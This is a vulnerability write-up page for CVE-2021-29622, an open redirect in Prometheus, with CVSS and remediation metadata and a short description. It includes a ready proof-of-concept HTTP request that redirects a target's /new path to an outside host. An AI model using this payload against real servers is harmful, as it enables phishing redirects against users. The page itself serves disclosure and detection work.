---
layout: post
cve_id: CVE-2021-29622
title: Prometheus - Open Redirect
pcap: true
pcap_path: /pcaps/2021/CVE-2021-29622.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-29622.yaml
snort2_rule: N/A
snort3_rule: N/A
author: geeknik
severity: medium
impact: 'An attacker can exploit this vulnerability to redirect users to malicious
  websites, leading to potential phishing attacks or the disclosure of sensitive information.

  '
remediation: The issue was patched in the 2.26.1 and 2.27.1 releases. In 2.28.0, the
  /new endpoint will be removed completely. The workaround is to disable access to
  /new via a reverse proxy in front of Prometheus.
reference:
- https://github.com/prometheus/prometheus/security/advisories/GHSA-vx57-7f4q-fpc7
- https://github.com/prometheus/prometheus/releases/tag/v2.26.1
- https://github.com/prometheus/prometheus/releases/tag/v2.27.1
- https://nvd.nist.gov/vuln/detail/CVE-2021-29622
- https://github.com/d4n-sec/d4n-sec.github.io
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2021-29622
  cwe-id: CWE-601
  epss-score: 0.8663
  epss-percentile: 0.99392
  cpe: cpe:2.3:a:prometheus:prometheus:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: prometheus
  product: prometheus
tags:
- cve2021
- cve
- prometheus
- redirect
- vuln
---

## üîç Vulnerability Description
Prometheus 2.23.0 through 2.26.0 and 2.27.0 contains an open redirect vulnerability. To ensure a seamless transition to 2.27.0, the default UI was changed to the new UI with a URL prefixed by /new redirect to /. Due to a bug in the code, an attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

## üåê HTTP Request
```nohighlight
GET /new/newhttp://interact.sh HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

